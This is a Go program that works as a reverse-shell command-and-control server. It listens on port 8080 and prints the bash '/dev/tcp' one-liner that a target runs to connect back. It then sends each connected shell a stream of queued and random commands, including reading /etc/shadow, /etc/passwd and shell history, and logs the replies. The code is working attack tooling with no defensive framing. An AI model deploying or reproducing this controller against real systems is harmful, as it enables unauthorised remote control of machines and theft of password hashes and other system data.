package main

import (
	"database/sql"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

var (
	dbPath      = "./commands.db"
	commandList = []string{
		"ls -la",
		"pwd",
		"whoami",
		"date",
		"uptime",
		"hostname",
		"df -h",
		"free -m",
		"ifconfig",
		"netstat -tuln",
		"iptables -L",
		"ps aux",
		"top -b -n1",
		"cat /etc/os-release",
		"uname -a",
		"curl ifconfig.me",
		"traceroute google.com",
		"ping -c 4 8.8.8.8",
		"cat /etc/passwd",
		"cat /etc/shadow",
		"history",
		"who",
		"last",
		"service --status-all",
		"systemctl list-units --type=service",
	}
)

func initDB() {
	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		db, err := sql.Open("sqlite3", dbPath)
		if err != nil {
			log.Fatalf("Failed to create DB: %v", err)
		}
		defer db.Close()

		_, err = db.Exec(`CREATE TABLE IF NOT EXISTS priority_commands (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			command TEXT NOT NULL
		);`)
		if err != nil {
			log.Fatalf("Failed to create table: %v", err)
		}
	}
}

func getPriorityCommands(db *sql.DB) ([]string, error) {
	rows, err := db.Query("SELECT command FROM priority_commands")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var cmds []string
	for rows.Next() {
		var cmd string
		if err := rows.Scan(&cmd); err != nil {
			return nil, err
		}
		cmds = append(cmds, cmd)
	}
	return cmds, nil
}

func handleConnection(conn net.Conn, db *sql.DB) {
	defer conn.Close()
	fmt.Printf("Accepted connection from %s\n", conn.RemoteAddr())

	go func() {
		for {
			// Priority commands first
			priorityCommands, err := getPriorityCommands(db)
			if err == nil && len(priorityCommands) > 0 {
				for _, command := range priorityCommands {
					_, err := conn.Write([]byte(command + "\n"))
					fmt.Printf("Sent PRIORITY to %s: %s\n", conn.RemoteAddr(), command)
					if err != nil {
						log.Printf("Error writing to connection %s: %v\n", conn.RemoteAddr(), err)
						return
					}
					time.Sleep(2 * time.Second)
				}
			}

			// Then random command
			time.Sleep(5 * time.Second)
			idx := time.Now().UnixNano() % int64(len(commandList))
			command := commandList[idx]
			_, err = conn.Write([]byte(command + "\n"))
			fmt.Printf("Sent to %s: %s\n", conn.RemoteAddr(), command)
			if err != nil {
				log.Printf("Error writing to connection %s: %v\n", conn.RemoteAddr(), err)
				return
			}
		}
	}()

	buf := make([]byte, 1024)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			log.Printf("Error reading from connection %s: %v\n", conn.RemoteAddr(), err)
			return
		}
		fmt.Printf("Received from %s: %s", conn.RemoteAddr(), string(buf[:n]))
	}
}

func main() {
	initDB()
	db, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		log.Fatalf("Error opening DB: %v", err)
	}
	defer db.Close()

	if len(os.Args) > 2 && os.Args[1] == "priority-add" {
		cmd := strings.Join(os.Args[2:], " ")
		_, err := db.Exec("INSERT INTO priority_commands (command) VALUES (?)", cmd)
		if err != nil {
			log.Fatalf("Failed to add priority command: %v", err)
		}
		fmt.Printf("Added priority command: %s\n", cmd)
		return
	}

	if len(os.Args) > 2 && os.Args[1] == "priority-remove" {
		cmd := strings.Join(os.Args[2:], " ")
		_, err := db.Exec("DELETE FROM priority_commands WHERE command = ?", cmd)
		if err != nil {
			log.Fatalf("Failed to remove priority command: %v", err)
		}
		fmt.Printf("Removed priority command: %s\n", cmd)
		return
	}

	port := ":8080"
	listener, err := net.Listen("tcp", port)
	if err != nil {
		log.Fatalf("Error listening on port %s: %v", port, err)
	}
	defer listener.Close()

	fmt.Printf("Listening for connections on %s\n", port)
	fmt.Printf("To connect, use: /bin/bash -i >& /dev/tcp/<ip>/%s 0>&1\n", strings.Split(port, ":")[1])

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Error accepting connection: %v\n", err)
			continue
		}
		go handleConnection(conn, db)
	}
}
